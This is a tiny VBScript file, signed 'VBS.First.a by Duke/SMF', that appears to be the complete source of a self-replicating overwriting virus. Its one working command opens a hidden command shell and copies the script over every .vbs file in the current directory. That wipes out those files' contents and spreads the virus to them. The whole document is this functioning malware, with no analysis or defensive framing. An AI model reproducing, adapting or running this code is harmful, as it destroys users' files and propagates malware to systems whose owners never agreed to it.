Set WshShell = Wscript.CreateObject("Wscript.Shell")
CP = WshShell.ExpandEnvironmentStrings("%COMSPEC%")
WshShell.Run (CP & " /c for %%v in (*.vbs) do copy /y " & Wscript.ScriptFullName & " %%v>nul"), vbHide
'VBS.First.a by Duke/SMF